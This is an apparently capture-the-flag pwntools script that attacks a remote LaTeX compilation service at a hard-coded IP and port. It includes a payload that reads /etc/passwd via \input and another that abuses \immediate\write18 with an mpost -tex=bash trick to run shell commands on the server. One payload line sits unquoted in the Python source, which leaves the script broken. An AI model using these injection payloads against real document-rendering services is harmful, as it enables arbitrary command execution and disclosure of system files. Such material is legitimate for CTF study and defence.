#!/usr/bin/env python 

from pwn import *

# Connect to the challenge
conn = remote('78.46.224.91', 24242)

def flag(r):
   r.sendline('flag')
   print r.recvline()

def help(r):
   r.sendline('help')
   print r.recvline()

def show(r):
   r.sendline('show')
   print r.recvline()
   # print r.recvuntil(" > ")

def compile(r, pname):
   r.sendline('compile %s' % (pname))
   print r.recvline()

def create(r, ptype, pname, msg):
   r.sendline('create %s %s' % (ptype, pname))
   r.sendline('%s' % (msg))
   print r.recvline()

# Get the main line
print conn.recvline()

msg = '''
\documentclass{article}
\begin{document}
\input{/etc/passwd}
\end{document}
\q
'''

\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (ls)>$(pwd)something.log" "x.mp"}
\end{document}

msg = """\documentclass{article}"""+"\n"+\
     """\\begin{document}"""+"\n"+\
     """\paragraph{} hello"""+"\n"+\
     """\end{document}"""+"\n"+\
     """\q"""

print msg

create(conn, "tex", "haba", msg)
compile(conn, "haba")
conn.interactive()
# show(conn)
conn.close()